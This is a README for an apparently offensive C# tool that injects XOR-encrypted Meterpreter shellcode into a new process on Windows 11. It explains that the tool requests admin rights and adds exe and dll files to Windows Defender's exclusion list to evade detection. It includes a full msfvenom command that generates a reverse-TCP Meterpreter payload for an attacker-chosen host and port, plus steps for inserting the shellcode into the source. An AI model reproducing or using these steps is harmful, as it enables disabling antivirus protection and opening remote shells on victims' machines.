# get-meterpreter-on-windows 11

for information visit https://youtu.be/HrBr6uKGCxs and watch my video

This is a csharp program to inject xor encrypted shellcode into a new process.
This is a modified code(the original code is from https://github.com/chr0n1k/AH2021Workshop/blob/master/Labs/Lab4:%20Simple%20process%20injection/program1.cs) that asks for admin rights at program startup and then adds exe and dll files to the exclusion list of windows defender to get a fully functional meterpreter session without have to worry about uploading stages won't work.

to generate shellcode use:

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IPADRESS> lport=<PORTNUMBER> -f csharp --encrypt xor --encryptkey ARICAHACKON



replace bytesize and shellcode in line 162:

byte[] xorshellcode = new byte[BYTESIZE] {SHELLCODE};
